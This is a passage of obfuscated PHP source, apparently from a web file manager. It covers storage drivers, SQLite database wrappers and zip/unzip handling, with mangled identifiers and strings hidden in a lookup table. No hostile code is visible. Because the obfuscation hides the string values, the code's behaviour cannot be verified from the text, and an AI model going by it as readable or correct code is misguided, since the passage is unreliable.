$şÚú¼™¹[399]); } $ÔÀŞÌ§ = self::$driverListUser[$ŒòÀ»·ø]; break; case KodIO::KOD_SHARE_LINK: $ÔÀŞÌ§ = array($şÚú¼™¹[1174] => $şÚú¼™¹[1177], $şÚú¼™¹[6] => $„Åï¶ÑÍ); $ãÔ¨‡¯€ = Action($şÚú¼™¹[1178])->sharePathInfo($„Åï¶ÑÍ[$şÚú¼™¹[84]]); $Úààéü = $ãÔ¨‡¯€[$şÚú¼™¹[411]]; if (!$ãÔ¨‡¯€[$şÚú¼™¹[411]]) { $–î•ç…Å = Model($şÚú¼™¹[610])->getInfo($ãÔ¨‡¯€[$şÚú¼™¹[498]]); $Úààéü = KodIO::clear($–î•ç…Å[$şÚú¼™¹[1179]] . $„Åï¶ÑÍ[$şÚú¼™¹[1172]]); $„Åï¶ÑÍ[$şÚú¼™¹[496]] = $–î•ç…Å; $„Åï¶ÑÍ[$şÚú¼™¹[1154]] = $Úààéü; $ÔÀŞÌ§ = array($şÚú¼™¹[1174] => $şÚú¼™¹[1180], $şÚú¼™¹[6] => $„Åï¶ÑÍ); } break; case KodIO::KOD_SHARE_ITEM: $ÔÀŞÌ§ = array($şÚú¼™¹[1174] => $şÚú¼™¹[1181], $şÚú¼™¹[6] => $„Åï¶ÑÍ); $–î•ç…Å = Model($şÚú¼™¹[610])->getInfo($„Åï¶ÑÍ[$şÚú¼™¹[399]]); if ($–î•ç…Å[$şÚú¼™¹[411]] == $şÚú¼™¹[197]) { $Úààéü = KodIO::clear($–î•ç…Å[$şÚú¼™¹[1179]] . $„Åï¶ÑÍ[$şÚú¼™¹[1172]]); $„Åï¶ÑÍ[$şÚú¼™¹[496]] = $–î•ç…Å; $„Åï¶ÑÍ[$şÚú¼™¹[1154]] = $Úààéü; $ÔÀŞÌ§ = array($şÚú¼™¹[1174] => $şÚú¼™¹[1182], $şÚú¼™¹[6] => $„Åï¶ÑÍ); } else { if (!$Úààéü) { $Úààéü = $–î•ç…Å[$şÚú¼™¹[411]]; } } break; default: $Úààéü = $„Åï¶ÑÍ[$şÚú¼™¹[84]]; $ÔÀŞÌ§ = array($şÚú¼™¹[1174] => $şÚú¼™¹[1183]); break; } $Ïë¡Ò™» = $„Åï¶ÑÍ[$şÚú¼™¹[84]]; if (!isset(self::$driverCache[$Ïë¡Ò™»])) { $·‘ŠıÇÎ = strtolower($ÔÀŞÌ§[$şÚú¼™¹[95]]); $çœ†¶çØ = $GLOBALS[$şÚú¼™¹[6]][$şÚú¼™¹[89]][$şÚú¼™¹[836]]; $ô®Àî³Ñ = $şÚú¼™¹[74] . (isset($çœ†¶çØ[$·‘ŠıÇÎ]) ? $çœ†¶çØ[$·‘ŠıÇÎ] : ucfirst($·‘ŠıÇÎ)); if (!class_exists($ô®Àî³Ñ)) { show_json("{$ô®Àî³Ñ}\x20\156\157\x74\40\145\x78\x69\163\164\x73\x21", !1); } $ó¡Û»‚§ = isset($ÔÀŞÌ§[$şÚú¼™¹[6]]) ? $ÔÀŞÌ§[$şÚú¼™¹[6]] : !1; self::$driverCache[$Ïë¡Ò™»] = new $ô®Àî³Ñ($ó¡Û»‚§); } $ìŞæÏ¼ï = self::$driverCache[$Ïë¡Ò™»]; $ìŞæÏ¼ï->pathDriver = $í€ÊÙ¦§; $ìŞæÏ¼ï->pathBase = $şÚú¼™¹[12]; if (isset($ÔÀŞÌ§[$şÚú¼™¹[6]][$şÚú¼™¹[1184]])) { $ìŞæÏ¼ï->pathBase = rtrim($ÔÀŞÌ§[$şÚú¼™¹[6]][$şÚú¼™¹[1184]], $şÚú¼™¹[8]) . $şÚú¼™¹[8]; $Úààéü = $ìŞæÏ¼ï->pathBase . ltrim($Úààéü, $şÚú¼™¹[8]); } $Úààéü = $ìŞæÏ¼ï->getPath($Úààéü); if (isset($„Åï¶ÑÍ[$şÚú¼™¹[1154]])) { $Úààéü = $„Åï¶ÑÍ[$şÚú¼™¹[1154]]; } $ìŞæÏ¼ï->path = $Úààéü; return $ìŞæÏ¼ï; } public static function errorTips($ĞÔ¥‚Ò = false) { $ºÑ««ëí =& $_SERVER[ïëó©ÒÚ]; static $˜¡šã§Ó = array(); $âÒ‘²ª = 1000; if ($ĞÔ¥‚Ò === -1) { return $˜¡šã§Ó ? $˜¡šã§Ó[count($˜¡šã§Ó) - 1] : $ºÑ««ëí[12]; } if ($ĞÔ¥‚Ò === !1) { return implode($ºÑ««ëí[231], $˜¡šã§Ó); } if (count($˜¡šã§Ó) >= $âÒ‘²ª) { $˜¡šã§Ó = array_slice($˜¡šã§Ó, $âÒ‘²ª * 0.5, $âÒ‘²ª); } $˜¡šã§Ó[] = $ĞÔ¥‚Ò; write_log($ºÑ««ëí[162] . ACTION . $ºÑ««ëí[1185] . $ĞÔ¥‚Ò, $ºÑ««ëí[1186]); } public static function getLastError($”µ¾Íåˆ = '') { $›‡Œ™ï = self::errorTips(-1); return $›‡Œ™ï ? $›‡Œ™ï : $”µ¾Íåˆ; } } goto A÷Ìˆ‡©éŒ; Dœçƒœ‚‚–: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¡¢ıñ¨ğ =& $_SERVER[ïëó©ÒÚ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¡¢ıñ¨ğ[6]] =& $config; $this->values[$¡¢ıñ¨ğ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¡¢ıñ¨ğ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($“ÎÁ‡“®) { if (1 === func_num_args()) { $this->{$“ÎÁ‡“®} = new $“ÎÁ‡“®(); } else { $ö»ÛÁÖÄ = new ReflectionClass($“ÎÁ‡“®); $„á‚Èç = func_get_args(); array_shift($„á‚Èç); $this->{$“ÎÁ‡“®} = $ö»ÛÁÖÄ->newInstanceArgs($„á‚Èç); } return $this->{$“ÎÁ‡“®}; } public function routeBind($ßÜ«°ä³, $º˜¸Üôı, $ˆäÃõ²® = 3) { $Ğ©ÙŸÏÀ =& $_SERVER[ïëó©ÒÚ]; $ƒõŞÇö = $this->in[$Ğ©ÙŸÏÀ[9]]; $ßÜ«°ä³ = str_replace($Ğ©ÙŸÏÀ[10], $Ğ©ÙŸÏÀ[11], trim(trim($ßÜ«°ä³, $Ğ©ÙŸÏÀ[8]), $Ğ©ÙŸÏÀ[12])); if (!$ßÜ«°ä³ || count($ƒõŞÇö) <= $ˆäÃõ²®) { return !1; } $³ª‡´â = !0; $­‡§¯¡Œ = explode($Ğ©ÙŸÏÀ[8], $ßÜ«°ä³); for ($©ÌÏ ŠÄ = 0; $©ÌÏ ŠÄ < count($­‡§¯¡Œ); $©ÌÏ ŠÄ++) { if ($­‡§¯¡Œ[$©ÌÏ ŠÄ] != $ƒõŞÇö[$ˆäÃõ²® + $©ÌÏ ŠÄ]) { $³ª‡´â = !1; break; } } if (!$³ª‡´â) { return; } call_user_func_array(array($this, $º˜¸Üôı), array()); } public function routeArgs($…ÍÏ™¶ = 3) { $¡À÷±áã = $this->in[$_SERVER[ïëó©ÒÚ][9]]; if (count($¡À÷±áã) <= $…ÍÏ™¶) { return array(); } $¸¶Ì¬úù = array(); for ($×Øß—÷‡ = $…ÍÏ™¶; $×Øß—÷‡ < count($¡À÷±áã); $×Øß—÷‡ += 2) { $¸¶Ì¬úù[$¡À÷±áã[$×Øß—÷‡]] = $¡À÷±áã[$×Øß—÷‡ + 1]; $this->in[$¡À÷±áã[$×Øß—÷‡]] = $¡À÷±áã[$×Øß—÷‡ + 1]; } return $¸¶Ì¬úù; } protected function assign($«ó¨à¥¡, $˜¹Ù¨Ôã) { $this->values[$«ó¨à¥¡] = $˜¹Ù¨Ôã; } protected function display($ËìşâéÅ) { ob_end_clean(); extract($this->values); require $this->tpl . $ËìşâéÅ; } } class DbSqliteBase extends Db { public function __construct($©Èîçˆµ = '') { $óÒ¶üá£ =& $_SERVER[ïëó©ÒÚ]; if (!extension_loaded($óÒ¶üá£[13])) { think_exception(think_lang($óÒ¶üá£[14]) . $óÒ¶üá£[15]); } if (!empty($©Èîçˆµ)) { if (!isset($©Èîçˆµ[$óÒ¶üá£[16]])) { $©Èîçˆµ[$óÒ¶üá£[16]] = 438; } $this->config = $©Èîçˆµ; if (empty($this->config[$óÒ¶üá£[17]])) { $this->config[$óÒ¶üá£[17]] = array(); } } } public function connect($»í¯­Ï× = '', $²û‡ã‡ı = 0) { $ÉÂùş® =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->linkID[$²û‡ã‡ı])) { if (empty($»í¯­Ï×)) { $»í¯­Ï× = $this->config; } $÷À°®Ú‘ = !empty($»í¯­Ï×[$ÉÂùş®[17]][$ÉÂùş®[18]]) ? $»í¯­Ï×[$ÉÂùş®[17]][$ÉÂùş®[18]] : $this->pconnect; $ƒ’‚³Ê = $÷À°®Ú‘ ? $ÉÂùş®[19] : $ÉÂùş®[20]; $this->linkID[$²û‡ã‡ı] = $ƒ’‚³Ê($»í¯­Ï×[$ÉÂùş®[21]], $»í¯­Ï×[$ÉÂùş®[16]]); if (!$this->linkID[$²û‡ã‡ı]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$²û‡ã‡ı], 30000); if (1 != think_config($ÉÂùş®[22])) { unset($this->config); } } return $this->linkID[$²û‡ã‡ı]; } public function free() { $this->queryID = null; } public function query($Ãùª¢ş‚) { $¦’×Ô—³ =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ãùª¢ş‚; if ($this->queryID) { $this->free(); } think_action_status($¦’×Ô—³[23], 1); think_status($¦’×Ô—³[24]); $this->queryID = sqlite_query($this->_linkID, $Ãùª¢ş‚); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ğ¥¡­„æ = $this->getAll(); return $ğ¥¡­„æ; } } public function execute($Òîè¨…Â) { $Şš†ÈÖÕ =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Òîè¨…Â; if ($this->queryID) { $this->free(); } think_action_status($Şš†ÈÖÕ[25], 1); think_status($Şš†ÈÖÕ[24]); $å¬Æ„˜ú = sqlite_exec($this->_linkID, $Òîè¨…Â); $this->debug(); if (!1 === $å¬Æ„˜ú) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ïëó©ÒÚ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $½”êü²â = sqlite_query($this->_linkID, $_SERVER[ïëó©ÒÚ][27]); if (!$½”êü²â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $şô×Ÿæ = sqlite_query($this->_linkID, $_SERVER[ïëó©ÒÚ][28]); if (!$şô×Ÿæ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $õŸ˜æôß = array(); if ($this->numRows > 0) { for ($•‡ ÇÒ• = 0; $•‡ ÇÒ• < $this->numRows; $•‡ ÇÒ•++) { $õŸ˜æôß[$•‡ ÇÒ•] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $õŸ˜æôß; } public function getFields($¬÷Ùõ‹) { $ìÉ¬’Ş =& $_SERVER[ïëó©ÒÚ]; $°ÇÜŠš” = $this->query($ìÉ¬’Ş[29] . $¬÷Ùõ‹ . $ìÉ¬’Ş[30]); $—’¨ÆöŸ = array(); if ($°ÇÜŠš”) { foreach ($°ÇÜŠš” as $åòƒ²ò¡ => $—¡Ó›Ñ) { $—’¨ÆöŸ[$—¡Ó›Ñ[$ìÉ¬’Ş[31]]] = array($ìÉ¬’Ş[32] => $—¡Ó›Ñ[$ìÉ¬’Ş[31]], $ìÉ¬’Ş[33] => $—¡Ó›Ñ[$ìÉ¬’Ş[34]], $ìÉ¬’Ş[35] => (bool) ($—¡Ó›Ñ[$ìÉ¬’Ş[36]] === $ìÉ¬’Ş[12]), $ìÉ¬’Ş[37] => $—¡Ó›Ñ[$ìÉ¬’Ş[38]], $ìÉ¬’Ş[39] => strtolower($—¡Ó›Ñ[$ìÉ¬’Ş[40]]) == $ìÉ¬’Ş[41], $ìÉ¬’Ş[42] => strtolower($—¡Ó›Ñ[$ìÉ¬’Ş[43]]) == $ìÉ¬’Ş[44]); } } return $—’¨ÆöŸ; } public function getTables($èŒ øõë = '') { $†’ü–³· =& $_SERVER[ïëó©ÒÚ]; $¡Áé‚’ = $this->query($†’ü–³·[45] . $†’ü–³·[46] . $†’ü–³·[47]); $è¥¸çì¢ = array(); foreach ($¡Áé‚’ as $‘·Øœ“Î => $…Ï½Æ÷é) { $è¥¸çì¢[$‘·Øœ“Î] = current($…Ï½Æ÷é); } return $è¥¸çì¢; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $â­ÏÇ¡ó =& $_SERVER[ïëó©ÒÚ]; $€–ûÑ®ê = sqlite_last_error($this->_linkID); $this->error = $€–ûÑ®ê . $â­ÏÇ¡ó[4] . sqlite_error_string($€–ûÑ®ê); if ($â­ÏÇ¡ó[12] != $this->queryStr) { $this->error .= LNG($â­ÏÇ¡ó[48]) . $this->queryStr; } think_trace($this->error, $â­ÏÇ¡ó[12], $â­ÏÇ¡ó[49]); return $this->error; } public function escapeString($¤ÃÇûº½) { return sqlite_escape_string($¤ÃÇûº½); } public function parseLimit($‘ö£¥œ­) { $şóÔ˜à° =& $_SERVER[ïëó©ÒÚ]; $åé÷ˆ = $şóÔ˜à°[12]; if (!empty($‘ö£¥œ­)) { $‘ö£¥œ­ = explode($şóÔ˜à°[50], $‘ö£¥œ­); if (count($‘ö£¥œ­) > 1) { $åé÷ˆ .= $şóÔ˜à°[51] . $‘ö£¥œ­[1] . $şóÔ˜à°[52] . $‘ö£¥œ­[0] . $şóÔ˜à°[53]; } else { $åé÷ˆ .= $şóÔ˜à°[51] . $‘ö£¥œ­[0] . $şóÔ˜à°[53]; } } return $åé÷ˆ; } } class DbSqlite3Base extends Db { public function __construct($Øõ³ò–“ = '') { $Ê¯ĞàŸ¬ =& $_SERVER[ïëó©ÒÚ]; if (!class_exists($Ê¯ĞàŸ¬[54])) { think_exception(think_lang($Ê¯ĞàŸ¬[14]) . $Ê¯ĞàŸ¬[55]); } if (!empty($Øõ³ò–“)) { if (!isset($Øõ³ò–“[$Ê¯ĞàŸ¬[16]])) { $Øõ³ò–“[$Ê¯ĞàŸ¬[16]] = 438; } $this->config = $Øõ³ò–“; if (empty($this->config[$Ê¯ĞàŸ¬[17]])) { $this->config[$Ê¯ĞàŸ¬[17]] = array(); } } } public function connect($©•è¶Ñ’ = '', $Íéê„Æ­ = 0) { $î®Ü‘ÑŠ =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->linkID[$Íéê„Æ­])) { if (empty($©•è¶Ñ’)) { $©•è¶Ñ’ = $this->config; } $this->linkID[$Íéê„Æ­] = new SQLite3($©•è¶Ñ’[$î®Ü‘ÑŠ[21]]); if (!$this->linkID[$Íéê„Æ­]) { think_exception($this->linkID[$Íéê„Æ­]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Íéê„Æ­]->busyTimeout(30000); if (1 != think_config($î®Ü‘ÑŠ[22])) { unset($this->config); } } return $this->linkID[$Íéê„Æ­]; } public function free() { $this->queryID = null; } public function query($»Œ¨¼Ù—) { $Á„òÂ™ı =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»Œ¨¼Ù—; if ($this->queryID) { $this->free(); } think_action_status($Á„òÂ™ı[23], 1); think_status($Á„òÂ™ı[24]); $this->queryID = $this->_linkID->query($»Œ¨¼Ù—); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ï˜èˆ¡ï = $this->getAll(); $this->numRows = count($Ï˜èˆ¡ï); return $Ï˜èˆ¡ï; } } public function execute($ÖÅ„ø…Ì) { $³»Í™ì =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÖÅ„ø…Ì; if ($this->queryID) { $this->free(); } think_action_status($³»Í™ì[25], 1); think_status($³»Í™ì[24]); $°à“¤€î = $this->_linkID->exec($ÖÅ„ø…Ì); $this->debug(); if (!1 === $°à“¤€î) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ïëó©ÒÚ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ùŸŞ ß² = $this->_linkID->query($_SERVER[ïëó©ÒÚ][27]); if (!$ùŸŞ ß²) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $­·ŒÅ• = $this->_linkID->query($_SERVER[ïëó©ÒÚ][28]); if (!$­·ŒÅ•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $šÛª³ÒÌ = array(); while ($óÚŒê¼ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $šÛª³ÒÌ[] = $óÚŒê¼; } $this->queryID->reset(); return $šÛª³ÒÌ; } public function getFields($èø²Ğ÷) { $ŠºÒ«¸· =& $_SERVER[ïëó©ÒÚ]; $§ô®·æÜ = $this->query($ŠºÒ«¸·[29] . $èø²Ğ÷ . $ŠºÒ«¸·[30]); $·îçÃÑ™ = array(); if ($§ô®·æÜ) { foreach ($§ô®·æÜ as $”Æâ˜˜Ç => $ìÌ©Û¡) { $·îçÃÑ™[$ìÌ©Û¡[$ŠºÒ«¸·[32]]] = array($ŠºÒ«¸·[32] => $ìÌ©Û¡[$ŠºÒ«¸·[32]], $ŠºÒ«¸·[33] => $ìÌ©Û¡[$ŠºÒ«¸·[33]], $ŠºÒ«¸·[35] => (bool) ($ìÌ©Û¡[$ŠºÒ«¸·[35]] === $ŠºÒ«¸·[12]), $ŠºÒ«¸·[37] => $ìÌ©Û¡[$ŠºÒ«¸·[56]], $ŠºÒ«¸·[39] => (bool) $ìÌ©Û¡[$ŠºÒ«¸·[57]], $ŠºÒ«¸·[42] => (bool) $ìÌ©Û¡[$ŠºÒ«¸·[57]]); } } return $·îçÃÑ™; } public function getTables($ëÇîÙ‰ = '') { $â§ÌººÌ =& $_SERVER[ïëó©ÒÚ]; $×Œœá› = $this->query($â§ÌººÌ[45] . $â§ÌººÌ[46] . $â§ÌººÌ[47]); $•‹¡„å´ = array(); foreach ($×Œœá› as $Îï´«ı¸ => $²¥‰ªèê) { $•‹¡„å´[$Îï´«ı¸] = current($²¥‰ªèê); } return $•‹¡„å´; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‹ ğ¢à =& $_SERVER[ïëó©ÒÚ]; $this->error = $this->_linkID->lastErrorMsg(); if ($‹ ğ¢à[12] != $this->queryStr) { $this->error .= LNG($‹ ğ¢à[48]) . $this->queryStr; } think_trace($this->error, $‹ ğ¢à[12], $‹ ğ¢à[49]); return $this->error; } public function escapeString($Ò±¢Êù‰) { $­ÁÀ®Æ =& $_SERVER[ïëó©ÒÚ]; if ($this->_linkID) { return $this->_linkID->escapeString($Ò±¢Êù‰); } return str_ireplace($­ÁÀ®Æ[58], $­ÁÀ®Æ[59], $Ò±¢Êù‰); } public function parseLimit($æ‘Äş†) { $£•³„š =& $_SERVER[ïëó©ÒÚ]; $‹ÏÑÖ’á = $£•³„š[12]; if (!empty($æ‘Äş†)) { $æ‘Äş† = explode($£•³„š[50], $æ‘Äş†); if (count($æ‘Äş†) > 1) { $‹ÏÑÖ’á .= $£•³„š[51] . $æ‘Äş†[1] . $£•³„š[52] . $æ‘Äş†[0] . $£•³„š[53]; } else { $‹ÏÑÖ’á .= $£•³„š[51] . $æ‘Äş†[0] . $£•³„š[53]; } } return $‹ÏÑÖ’á; } } goto eÕ”åÇ®ëº; A÷Ìˆ‡©éŒ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $’ä²êÌ¯; if (!$’ä²êÌ¯) { $¢ıòš×‘ = IO::init($_SERVER[ïëó©ÒÚ][8]); } return $¢ıòš×‘; } private static function iconvSystem($£¶Ò²œŒ) { return self::local()->iconvSystem($£¶Ò²œŒ); } private static function iconvApp($ÑÃåş·’) { return self::local()->iconvApp($ÑÃåş·’); } public static function zip($¬„ÓÈîé, $­×ÄÎ¶Ì = "\x7a\151\160", $âª—şĞ˜ = '', $¯³Ùá– = REPEAT_RENAME) { $‘Ø£°‚ =& $_SERVER[ïëó©ÒÚ]; $Å¸«¤Ö = self::init($¬„ÓÈîé[0][$‘Ø£°‚[84]]); $û£ÜØ´š = self::info($¬„ÓÈîé[0][$‘Ø£°‚[84]]); $Ù¡ãşª° = !1; if (!$âª—şĞ˜ && $Å¸«¤Ö->getType() == $‘Ø£°‚[106]) { $ŞŞÅ¶°Á = self::zipFileList($¬„ÓÈîé); } else { $Ù¡ãşª° = $âª—şĞ˜ ? $âª—şĞ˜ : TEMP_FILES . $‘Ø£°‚[1187] . time() . rand_string(8) . $‘Ø£°‚[8]; mk_dir($Ù¡ãşª°); $ŞŞÅ¶°Á = self::zipFileList($¬„ÓÈîé, $Ù¡ãşª°); } $•Š‰äˆº = $û£ÜØ´š[$‘Ø£°‚[32]]; if (count($ŞŞÅ¶°Á) > 1) { $ÓÏ†¹¹¨ = IO::info(IO::pathFather($û£ÜØ´š[$‘Ø£°‚[84]])); $•Š‰äˆº = $ÓÏ†¹¹¨[$‘Ø£°‚[32]]; } $»³œ”ñ = $Ù¡ãşª°; if (!$»³œ”ñ) { $»³œ”ñ = get_path_father($û£ÜØ´š[$‘Ø£°‚[84]]); if (!$âª—şĞ˜ && $Å¸«¤Ö->getType() == $‘Ø£°‚[106]) { $»³œ”ñ = get_path_father($Å¸«¤Ö->path); } $¯ØíÒˆÄ = IO::info($»³œ”ñ); if (!$¯ØíÒˆÄ[$‘Ø£°‚[202]]) { show_json(LNG($‘Ø£°‚[1188]), !1); } } $£à£» = $»³œ”ñ . $•Š‰äˆº . $‘Ø£°‚[10] . $­×ÄÎ¶Ì; $£à£» = get_filename_auto($£à£», $‘Ø£°‚[12], $¯³Ùá–); $„‡õœÊ– = self::iconvSystem($£à£»); foreach ($ŞŞÅ¶°Á as $‚âø‘´ü => $§˜ÒŠµ) { $ŞŞÅ¶°Á[$‚âø‘´ü] = self::iconvSystem($§˜ÒŠµ); } KodArchive::create($„‡õœÊ–, $ŞŞÅ¶°Á); if (!IO::exist($£à£»)) { if ($Ù¡ãşª°) { del_dir($Ù¡ãşª°); } show_json(LNG($‘Ø£°‚[1189]), !1); } if ($âª—şĞ˜ || !$Ù¡ãşª°) { if ($Ù¡ãşª° && strstr($Ù¡ãşª°, TEMP_FILES)) { $Œ¿ÖÓÚô = $ŞŞÅ¶°Á = array(); recursion_dir($»³œ”ñ, $Œ¿ÖÓÚô, $ŞŞÅ¶°Á, 0); foreach ($Œ¿ÖÓÚô as $ßÉ†â²ó) { del_dir($ßÉ†â²ó); } foreach ($ŞŞÅ¶°Á as $Í¥±ı³) { if ($Í¥±ı³ == $„‡õœÊ–) { continue; } del_file($Í¥±ı³); } } return $£à£»; } $ÈóÇƒî† = self::pathFather($û£ÜØ´š[$‘Ø£°‚[84]]); $êÛ„Ï¥× = self::move($£à£», $ÈóÇƒî†, $¯³Ùá–); if (!$êÛ„Ï¥×) { del_dir($Ù¡ãşª°); show_json(LNG($‘Ø£°‚[1189]), !1); } del_dir($Ù¡ãşª°); return $êÛ„Ï¥×; } public static function unzip($ÈÈ¹• , $•á×ôà = "\162\145\160\x6c\x61\143\x65") { $¦“ıÔúß =& $_SERVER[ïëó©ÒÚ]; $îç²¼ø· = $ÈÈ¹• [$¦“ıÔúß[84]]; $ä¥»¯Ø = $ÈÈ¹• [$¦“ıÔúß[1190]]; if (!($¶÷ºáÅ¾ = parent::info($îç²¼ø·))) { show_json(LNG($¦“ıÔúß[1191]), !1); } if (!($ÑÄ·ªÜÕ = parent::infoFull($ä¥»¯Ø))) { $ä¥»¯Ø = parent::mkdir($ä¥»¯Ø); $ÑÄ·ªÜÕ = array($¦“ıÔúß[84] => $ä¥»¯Ø); } else { if (isset($ÑÄ·ªÜÕ[$¦“ıÔúß[411]]) && trim($ÑÄ·ªÜÕ[$¦“ıÔúß[84]], $¦“ıÔúß[8]) != trim($ä¥»¯Ø, $¦“ıÔúß[8])) { $®ˆñà„› = KodIO::make($ÑÄ·ªÜÕ[$¦“ıÔúß[441]]); $ø…Áë¸‘ = parent::fileNameAuto($®ˆñà„›, $ÑÄ·ªÜÕ[$¦“ıÔúß[32]], REPEAT_RENAME_FOLDER, !0); $ä¥»¯Ø = parent::mkdir($®ˆñà„› . $ø…Áë¸‘); $ÑÄ·ªÜÕ = array($¦“ıÔúß[84] => $ä¥»¯Ø); } } $ä¥»¯Ø = $ÑÄ·ªÜÕ[$¦“ıÔúß[84]]; $ºÈˆú…ü = self::tmpFileName($¶÷ºáÅ¾); $ö„¸Æ»± = TEMP_FILES . $ºÈˆú…ü; del_dir($ö„¸Æ»±); mk_dir($ö„¸Æ»±); $Ú¡œÉˆ = self::fileExt($¶÷ºáÅ¾); $Æ¬ÉÉÖÇ = $ö„¸Æ»± . $¦“ıÔúß[10] . $Ú¡œÉˆ; if (!@file_exists(self::iconvSystem($Æ¬ÉÉÖÇ))) { $Ş™ª¥±˜ = self::localFilePath($îç²¼ø·, $Ú¡œÉˆ); $Æ¬ÉÉÖÇ = $Ş™ª¥±˜ ? $Ş™ª¥±˜ : parent::download($îç²¼ø·, $Æ¬ÉÉÖÇ); } $Æ¬ÉÉÖÇ = self::iconvSystem($Æ¬ÉÉÖÇ); $­ÚàæãÂ = isset($ÈÈ¹• [$¦“ıÔúß[1192]]) ? $ÈÈ¹• [$¦“ıÔúß[1192]] : $¦“ıÔúß[1193]; $ø²Åõ¦Ù = KodArchive::extract($Æ¬ÉÉÖÇ, $ö„¸Æ»± . $¦“ıÔúß[8], $­ÚàæãÂ); self::archiveExt(); if (!$ø²Åõ¦Ù[$¦“ıÔúß[1194]]) { show_json($¦“ıÔúß[1195] . $ø²Åõ¦Ù[$¦“ıÔúß[1196]], !1); } Hook::trigger($¦“ıÔúß[1197], $ö„¸Æ»±); recursion_dir($ö„¸Æ»±, $Ñç†Óş™, $·Şø·œ, 0); $ÙÑ…¿éú = array_merge($Ñç†Óş™, $·Şø·œ); foreach ($ÙÑ…¿éú as $ç»Û©ÙÜ) { $ç»Û©ÙÜ = self::iconvApp($ç»Û©ÙÜ); self::move($ç»Û©ÙÜ, $ä¥»¯Ø, $•á×ôà); } del_dir($ö„¸Æ»±); if (!$Ş™ª¥±˜) { del_file($Æ¬ÉÉÖÇ); } return !0; } public static function unzipList($ßÊè´ ) { $¥Øèªí« =& $_SERVER[ïëó©ÒÚ]; $ÏÔàŒŒğ = $ßÊè´ [$¥Øèªí«[84]]; $í­ã›¡ = isset($ßÊè´ [$¥Øèªí«[1198]]) ? $ßÊè´ [$¥Øèªí«[1198]] : -1; $Œ†ç³Óû = 50000; if (request_url_safe($ÏÔàŒŒğ)) { $«¯ñ‹‚Ì = parse_url_query($ÏÔàŒŒğ); if (!isset($«¯ñ‹‚Ì[$¥Øèªí«[84]])) { show_json($¥Øèªí«[1199], !1); } } $¡…©³³Å = isset($«¯ñ‹‚Ì) ? $«¯ñ‹‚Ì[$¥Øèªí«[84]] : $ÏÔàŒŒğ; $éˆü¿Êç = self::info($¡…©³³Å); $‘á„¢¶Ö = self::fileExt($éˆü¿Êç); $îüúŸÔú = self::tmpFileName($éˆü¿Êç); if (isset($«¯ñ‹‚Ì)) { $ñü—ûö¢ = array($«¯ñ‹‚Ì[$¥Øèªí«[84]], $«¯ñ‹‚Ì[$¥Øèªí«[1198]], $«¯ñ‹‚Ì[$¥Øèªí«[32]]); $§‡“‹¥ = md5(implode($¥Øèªí«[11], $ñü—ûö¢)) . $¥Øèªí«[10] . get_path_ext($«¯ñ‹‚Ì[$¥Øèªí«[32]]); } else { $ñü—ûö¢ = array($éˆü¿Êç[$¥Øèªí«[32]], $éˆü¿Êç[$¥Øèªí«[84]], $éˆü¿Êç[$¥Øèªí«[76]]); $§‡“‹¥ = md5(implode($¥Øèªí«[11], $ñü—ûö¢)) . $¥Øèªí«[10] . $‘á„¢¶Ö; } if ($í­ã›¡ == -1) { $‹øò¤»Ã = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\151\x65\x77\x2f{$îüúŸÔú}\57{$§‡“‹¥}\56\154\157\147"; $›İì³ş = self::infoFull($‹øò¤»Ã); if ($›İì³ş) { $‹øò¤»Ã = $›İì³ş[$¥Øèªí«[84]]; $õÉ–›º = self::getContent($‹øò¤»Ã); if ($õÉ–›º) { $ÆËßùÀç = json_decode($õÉ–›º, !0); $ÆËßùÀç = is_array($ÆËßùÀç) ? $ÆËßùÀç : array(); if (count($ÆËßùÀç) >= $Œ†ç³Óû) { show_json(sprintf(LNG($¥Øèªí«[1200]), count($ÆËßùÀç)), !1); } return $ÆËßùÀç; } } else { $‹øò¤»Ã = self::mkfile($‹øò¤»Ã); } } $øãŒœÍ› = TEMP_FILES . $îüúŸÔú; if (!is_dir($øãŒœÍ›)) { mk_dir($øãŒœÍ›); } $šø±ßöË = $øãŒœÍ› . 